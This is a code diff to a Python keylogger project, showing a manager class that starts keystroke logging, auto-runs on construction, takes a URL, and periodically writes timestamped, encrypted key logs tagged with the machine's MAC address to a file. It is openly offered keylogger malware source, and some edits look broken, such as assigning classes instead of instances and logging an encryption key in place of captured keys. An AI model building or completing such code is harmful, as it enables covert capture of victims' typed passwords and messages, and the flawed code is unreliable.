@@ -1,15 +1,20 @@
+#Librerys
 import threading
 import datetime
-import uuid
-from cryptography.fernet import Fernet
+#Clases
+from KelogerService import KeyLoggerService
+from Writer import Writer
+from Encryption import EncryptionClient
+
 
 class KeyLoggerManager:
-    def __init__(self,keylogger_service,file_writer,encryptor,interval=60):
-        self.keylogger_service = keylogger_service
-        self.file_writer = file_writer
-        self.encryptor = encryptor
+    def __init__(self,url,interval=60):
+        self.keylogger_service = KeyLoggerService
+        self.file_writer = Writer
+        self.encryptor = EncryptionClient
         self.interval = interval
         self.running = False
+        self.start()
 
     def start(self):
         self.keylogger_service.start_logging()
@@ -29,7 +34,7 @@ class KeyLoggerManager:
 
 
     def _write_keys_to_file(self):
-        keys = self.keylogger_service.get_logged_keys()
+        keys = self.encryptor.KEY
         if keys:
             timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
             mac_address = self.encryptor.get_mac_address()
@@ -43,8 +48,6 @@ class KeyLoggerManager:
             self.file_writer.write_to_file(log_entry)
         self._schedule_next_write()
 
-def generate_key():
-    return Fernet.generate_key()
 
 
 if __name__ == "__main__":
